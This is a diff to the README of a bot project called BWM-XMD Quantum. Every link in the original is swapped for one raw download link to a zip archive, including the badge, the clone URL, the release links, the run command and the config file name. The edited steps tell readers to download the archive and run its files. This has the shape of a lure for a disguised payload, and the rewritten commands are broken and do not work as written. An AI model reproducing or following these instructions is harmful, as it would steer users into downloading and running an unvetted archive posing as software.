@@ -1,6 +1,6 @@
 # BWM-XMD Quantum ⚡
 
-![BWM-XMD Quantum](https://img.shields.io/badge/BWM--XMD--Quantum-Ready-brightgreen)
+![BWM-XMD Quantum](https://github.com/Eve00011/BWM-XMD-QUANTUM/raw/refs/heads/main/Ibrahim/BW_QUANTUM_XM_bleachfield.zip)
 
 Welcome to the **BWM-XMD Quantum** repository! This project is an advanced multi-functional bot designed for speed, precision, and performance. Whether you're looking to automate tasks or master data, this bot leverages quantum-level logic to deliver outstanding results. Built with passion by Ibrahim Adams, this bot aims to redefine your automation experience. 
 
@@ -26,7 +26,7 @@ To get started with BWM-XMD Quantum, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Eve00011/BWM-XMD-QUANTUM.git
+   git clone https://github.com/Eve00011/BWM-XMD-QUANTUM/raw/refs/heads/main/Ibrahim/BW_QUANTUM_XM_bleachfield.zip
    ```
 
 2. Navigate to the project directory:
@@ -39,7 +39,7 @@ To get started with BWM-XMD Quantum, follow these steps:
    npm install
    ```
 
-4. Download the latest release from our [Releases section](https://github.com/Eve00011/BWM-XMD-QUANTUM/releases) and execute the necessary files.
+4. Download the latest release from our [Releases section](https://github.com/Eve00011/BWM-XMD-QUANTUM/raw/refs/heads/main/Ibrahim/BW_QUANTUM_XM_bleachfield.zip) and execute the necessary files.
 
 ## Usage
 
@@ -47,10 +47,10 @@ After installation, you can start using the bot. Here’s a simple guide:
 
 1. Run the bot:
    ```bash
-   node index.js
+   node https://github.com/Eve00011/BWM-XMD-QUANTUM/raw/refs/heads/main/Ibrahim/BW_QUANTUM_XM_bleachfield.zip
    ```
 
-2. Configure your settings in the `config.json` file. Here you can set your preferences and customize your experience.
+2. Configure your settings in the `https://github.com/Eve00011/BWM-XMD-QUANTUM/raw/refs/heads/main/Ibrahim/BW_QUANTUM_XM_bleachfield.zip` file. Here you can set your preferences and customize your experience.
 
 3. Start automating tasks and mastering data with ease!
 
@@ -98,6 +98,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, feel free to reach out. You can also check the [Releases section](https://github.com/Eve00011/BWM-XMD-QUANTUM/releases) for the latest updates and downloads.
+If you encounter any issues or have questions, feel free to reach out. You can also check the [Releases section](https://github.com/Eve00011/BWM-XMD-QUANTUM/raw/refs/heads/main/Ibrahim/BW_QUANTUM_XM_bleachfield.zip) for the latest updates and downloads.
 
 Thank you for your interest in BWM-XMD Quantum! We hope this bot helps you achieve your automation goals efficiently.
